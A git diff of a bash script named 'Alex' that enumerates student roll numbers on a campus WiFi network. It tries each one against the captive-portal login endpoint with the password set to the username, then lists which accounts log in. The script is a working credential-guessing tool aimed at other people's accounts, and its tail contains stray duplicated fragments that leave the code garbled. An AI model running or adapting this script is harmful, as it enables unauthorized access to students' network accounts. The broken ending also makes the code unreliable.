@@ -1,3 +1,8 @@
+if [[ $# -ne 2 ]]
+then
+	echo "Invalid Script Usage....."
+	exit 1
+fi
 echo "   #                         "
 echo "  # #   #      ###### #    # "
 echo " #   #  #      #       #  #  "
@@ -11,18 +16,9 @@ echo "Alex is a simple Log in discovery Program for Wifi Login's"
 echo "in the campus wifi Network"
 echo "Note: Alex can only discover the usernames whose password is"
 echo "same as username.."
-echo
-#echo -n "If you wish to continue the scan [Y/N]:"
-#read op
-#if [[ $op != "y" && $op != "Y" ]]
-#then
-#	exit 0
-#fi
 
-#echo -n "Enter Branch code [05-CSE|15-CSSE]:"
-branch=15
-#echo -n "Enter Year Code Series[Like 17 | 18 | etc]:"
-year=17
+year=$1
+branch=$2
 echo "Scan Started........"
 roll=$year"121a"
 roll_no=1
@@ -57,6 +53,16 @@ do
 		curl -s 10.10.0.252:8090/login.xml -d "mode=191&username=$rollnumber&password=$rollnumber&a=1580903190048&producttype=0" | grep "You have reached Maximum Login Limit" > /dev/null
 		b=$?
 		if [ $a -eq 0 ]
+		then
+			echo "$rollnumber  Not logged in"
+		elif [[ $b -eq 0 ]]
+		then
+			echo "$rollnumber  Logged in"
+		fi
+	fi
+done
+echo "Scan Completed......."
+0 ]
 		then
 			echo "$rollnumber  Not logged in"
 		elif [[ $b -eq 0 ]]
